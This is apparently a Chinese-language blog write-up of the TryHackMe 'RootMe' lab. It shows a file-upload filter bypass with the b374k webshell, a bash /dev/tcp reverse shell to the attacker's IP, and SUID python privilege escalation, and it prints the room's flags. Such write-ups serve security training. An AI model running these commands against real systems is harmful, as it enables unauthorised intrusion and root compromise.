---
title: Root Me (Try Hack Me Writeup)
date: 2021-07-24T13:15:00+08:00
draft: false
url: "/2021/07/24/root-me-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

題目網址 : https://tryhackme.com/room/rrootme  
  
目標IP : 10.10.233.205

## Scanning

- 起手式 nmap`nmap -A 10.10.233.205`
- ![](/uploads/2022/02/86591-mLaLomQ.png)22 : SSH7.6p1 有枚舉的漏洞 CVE-2018-15473
- https://github.com/sriramoffcl/OpenSSH-7.6p1-Exploit-py-/blob/master/45233.py80 : Apache- Apache httpd 2.4.29nmap 掃描的同一時間，先打開網頁看看- ![](/uploads/2022/02/7f376-NejdpQC.png)
- 網頁起手式 dirsearch`python3 dirsearch.py -u http://10.10.233.205/ -e all`
- 看起來可能會有趣的路徑`/panel/`
- `/uploads/`

## 上傳 webshell

- `/panel/` 可以上傳檔案![](/uploads/2022/02/d0c94-QOZqOa5.png)
- 用 Wappalyzer 可以確定他是 PHP![](/uploads/2022/02/808aa-awe80bs.png)上傳個 b374k.php- ![](/uploads/2022/02/515ee-b6tqtn1.png)
- 會噴錯，Google翻譯說 `PHP是不允許的！` (葡萄牙文)使用 php 副檔名解析漏洞測試- Apache 1.x 2.x 文件解析特性BJ4測試檔名 `b374k.php.aaa`- ![](/uploads/2022/02/2ce91-ZIsfjUj.png)Google 翻譯 :`文件上傳成功！`

## 使用 Webshell

- 點下面的 `Veja!` 會跳轉到 `http://10.10.233.205/uploads/b374k.php.aaa`![](/uploads/2022/02/94b34-QYfQaPb.png)
- 使用預設密碼就能進入 shell

## 戳入 Reverse Shell

- Webshell 滿好用的，但是Reverse shell用起來更爽確認攻擊機 ip 為 10.14.7.198終端機輸入 `nc -vlk 7877`webshell 的 Terminal 輸入- `bash -c 'bash -i >& /dev/tcp/10.14.7.198/7877 0>&1'`即可順利連上 Reverse shell- ![](/uploads/2022/02/f3495-iKRzVfo.png)輸入指令讓他變得更 interactive 一點- `python -c 'import pty; pty.spawn("/bin/bash")'`

## 在電腦裡面逛大街

- user.txt![](/uploads/2022/02/e6c32-jxS368J.png)
- `THM{y0u_g0t_a_sh3ll`

## 設法提權

- 使用內建的上傳功能上傳 LinEnum.sh開權限 `chmod +x LinEnum.sh`
- 執行，並存到檔案 `./LinEnum.sh | tee meow.txt`
- 基本上優先注意紅色、橘色的東西![](/uploads/2022/02/9786b-ikR24Co.png)找到有趣ㄉ東西!! `[+] Possibly interesting SUID files: -rwsr-sr-x 1 root root 3665768 Aug 4 2020 /usr/bin/python`- 也就是說 `/usr/bin/python` 可以用 SUID 執行
- 到 [GTFOBins](https://gtfobins.github.io/) 找 Python 有 SUID 的提權方法`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

## 提權成功!!

- ![](/uploads/2022/02/78e38-jeFvVXw.png)
- Flag : `THM{pr1v1l3g3_3sc4l4t10n}`
